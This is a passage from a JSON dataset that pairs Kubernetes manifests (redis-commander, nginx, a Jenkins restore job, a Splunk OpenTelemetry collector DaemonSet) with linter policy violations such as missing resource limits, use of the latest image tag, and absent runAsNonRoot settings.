    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-commander\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/redis-commander: runtime/default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis-commander\n  template:\n    metadata:\n      labels:\n        app: redis-commander\n        tier: backend\n    spec:\n      containers:\n      - name: redis-commander\n        image: rediscommander/redis-commander\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOSTS\n          value: instance1:redis:6379\n        - name: K8S_SIGTERM\n          value: '1'\n        ports:\n        - name: redis-commander\n          containerPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /favicon.png\n            port: 8081\n          initialDelaySeconds: 10\n          timeoutSeconds: 5\n        securityContext:\n          runAsNonRoot: true\n          readOnlyRootFilesystem: false\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"redis-commander\" has memory limit 0"
  },
  {
    "id": "01473",
    "manifest_path": "data/manifests/the_stack_sample/sample_0471.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9833\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01474",
    "manifest_path": "data/manifests/the_stack_sample/sample_0471.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9833\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "01475",
    "manifest_path": "data/manifests/the_stack_sample/sample_0471.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9833\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "01476",
    "manifest_path": "data/manifests/the_stack_sample/sample_0471.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9833\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "01477",
    "manifest_path": "data/manifests/the_stack_sample/sample_0471.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9833\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "01478",
    "manifest_path": "data/manifests/the_stack_sample/sample_0473.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello\nspec:\n  containers:\n  - image: felipeogutierrez/explore-akka:1.1\n    name: hello\n    imagePullPolicy: Always\n    args:\n    - '83.1'\n    ports:\n    - containerPort: 8001\n      name: http\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hello\" does not have a read-only root file system"
  },
  {
    "id": "01479",
    "manifest_path": "data/manifests/the_stack_sample/sample_0473.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello\nspec:\n  containers:\n  - image: felipeogutierrez/explore-akka:1.1\n    name: hello\n    imagePullPolicy: Always\n    args:\n    - '83.1'\n    ports:\n    - containerPort: 8001\n      name: http\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hello\" is not set to runAsNonRoot"
  },
  {
    "id": "01480",
    "manifest_path": "data/manifests/the_stack_sample/sample_0473.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello\nspec:\n  containers:\n  - image: felipeogutierrez/explore-akka:1.1\n    name: hello\n    imagePullPolicy: Always\n    args:\n    - '83.1'\n    ports:\n    - containerPort: 8001\n      name: http\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hello\" has cpu request 0"
  },
  {
    "id": "01481",
    "manifest_path": "data/manifests/the_stack_sample/sample_0473.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hello\nspec:\n  containers:\n  - image: felipeogutierrez/explore-akka:1.1\n    name: hello\n    imagePullPolicy: Always\n    args:\n    - '83.1'\n    ports:\n    - containerPort: 8001\n      name: http\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hello\" has memory limit 0"
  },
  {
    "id": "01482",
    "manifest_path": "data/manifests/the_stack_sample/sample_0474.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: restore-jenkins\nspec:\n  template:\n    spec:\n      containers:\n      - name: download-dataset\n        image: google/cloud-sdk:latest\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /certs\n          name: gcloud-certs\n          readOnly: true\n        - mountPath: /transfer\n          name: transfer\n        command:\n        - sh\n        - -c\n        - 'gcloud auth activate-service-account --key-file=/certs/svc_account.json\n\n\n          gsutil cp \"<JENKINS_BACKUP_BUCKET>/jenkins.tar.gz\" /transfer/jenkins.tar.gz\n\n          cd /transfer\n\n          tar -xzvf jenkins.tar.gz\n\n          rm jenkins.tar.gz\n\n          cd jenkins_home\n\n          find . -maxdepth 1 -exec mv {} .. \\;\n\n          cd ..\n\n          rm -rf jenkins_home\n\n          '\n      volumes:\n      - name: gcloud-certs\n        secret:\n          secretName: gcloud-creds\n      - name: transfer\n        persistentVolumeClaim:\n          claimName: <EXISTING_CLAIM>\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"download-dataset\" is using an invalid container image, \"google/cloud-sdk:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01483",
    "manifest_path": "data/manifests/the_stack_sample/sample_0474.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: restore-jenkins\nspec:\n  template:\n    spec:\n      containers:\n      - name: download-dataset\n        image: google/cloud-sdk:latest\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /certs\n          name: gcloud-certs\n          readOnly: true\n        - mountPath: /transfer\n          name: transfer\n        command:\n        - sh\n        - -c\n        - 'gcloud auth activate-service-account --key-file=/certs/svc_account.json\n\n\n          gsutil cp \"<JENKINS_BACKUP_BUCKET>/jenkins.tar.gz\" /transfer/jenkins.tar.gz\n\n          cd /transfer\n\n          tar -xzvf jenkins.tar.gz\n\n          rm jenkins.tar.gz\n\n          cd jenkins_home\n\n          find . -maxdepth 1 -exec mv {} .. \\;\n\n          cd ..\n\n          rm -rf jenkins_home\n\n          '\n      volumes:\n      - name: gcloud-certs\n        secret:\n          secretName: gcloud-creds\n      - name: transfer\n        persistentVolumeClaim:\n          claimName: <EXISTING_CLAIM>\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"download-dataset\" does not have a read-only root file system"
  },
  {
    "id": "01484",
    "manifest_path": "data/manifests/the_stack_sample/sample_0474.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: restore-jenkins\nspec:\n  template:\n    spec:\n      containers:\n      - name: download-dataset\n        image: google/cloud-sdk:latest\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /certs\n          name: gcloud-certs\n          readOnly: true\n        - mountPath: /transfer\n          name: transfer\n        command:\n        - sh\n        - -c\n        - 'gcloud auth activate-service-account --key-file=/certs/svc_account.json\n\n\n          gsutil cp \"<JENKINS_BACKUP_BUCKET>/jenkins.tar.gz\" /transfer/jenkins.tar.gz\n\n          cd /transfer\n\n          tar -xzvf jenkins.tar.gz\n\n          rm jenkins.tar.gz\n\n          cd jenkins_home\n\n          find . -maxdepth 1 -exec mv {} .. \\;\n\n          cd ..\n\n          rm -rf jenkins_home\n\n          '\n      volumes:\n      - name: gcloud-certs\n        secret:\n          secretName: gcloud-creds\n      - name: transfer\n        persistentVolumeClaim:\n          claimName: <EXISTING_CLAIM>\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"download-dataset\" is not set to runAsNonRoot"
  },
  {
    "id": "01485",
    "manifest_path": "data/manifests/the_stack_sample/sample_0474.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: restore-jenkins\nspec:\n  template:\n    spec:\n      containers:\n      - name: download-dataset\n        image: google/cloud-sdk:latest\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /certs\n          name: gcloud-certs\n          readOnly: true\n        - mountPath: /transfer\n          name: transfer\n        command:\n        - sh\n        - -c\n        - 'gcloud auth activate-service-account --key-file=/certs/svc_account.json\n\n\n          gsutil cp \"<JENKINS_BACKUP_BUCKET>/jenkins.tar.gz\" /transfer/jenkins.tar.gz\n\n          cd /transfer\n\n          tar -xzvf jenkins.tar.gz\n\n          rm jenkins.tar.gz\n\n          cd jenkins_home\n\n          find . -maxdepth 1 -exec mv {} .. \\;\n\n          cd ..\n\n          rm -rf jenkins_home\n\n          '\n      volumes:\n      - name: gcloud-certs\n        secret:\n          secretName: gcloud-creds\n      - name: transfer\n        persistentVolumeClaim:\n          claimName: <EXISTING_CLAIM>\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"download-dataset\" has cpu request 0"
  },
  {
    "id": "01486",
    "manifest_path": "data/manifests/the_stack_sample/sample_0474.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: restore-jenkins\nspec:\n  template:\n    spec:\n      containers:\n      - name: download-dataset\n        image: google/cloud-sdk:latest\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /certs\n          name: gcloud-certs\n          readOnly: true\n        - mountPath: /transfer\n          name: transfer\n        command:\n        - sh\n        - -c\n        - 'gcloud auth activate-service-account --key-file=/certs/svc_account.json\n\n\n          gsutil cp \"<JENKINS_BACKUP_BUCKET>/jenkins.tar.gz\" /transfer/jenkins.tar.gz\n\n          cd /transfer\n\n          tar -xzvf jenkins.tar.gz\n\n          rm jenkins.tar.gz\n\n          cd jenkins_home\n\n          find . -maxdepth 1 -exec mv {} .. \\;\n\n          cd ..\n\n          rm -rf jenkins_home\n\n          '\n      volumes:\n      - name: gcloud-certs\n        secret:\n          secretName: gcloud-creds\n      - name: transfer\n        persistentVolumeClaim:\n          claimName: <EXISTING_CLAIM>\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"download-dataset\" has memory limit 0"
  },
  {
    "id": "01487",
    "manifest_path": "data/manifests/the_stack_sample/sample_0475.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.7.9\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "01488",
    "manifest_path": "data/manifests/the_stack_sample/sample_0475.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.7.9\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "01489",
    "manifest_path": "data/manifests/the_stack_sample/sample_0475.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.7.9\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "01490",
    "manifest_path": "data/manifests/the_stack_sample/sample_0475.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.7.9\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "01491",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fluentd\" does not have a read-only root file system"
  },
  {
    "id": "01492",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"otel-collector\" does not have a read-only root file system"
  },
  {
    "id": "01493",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
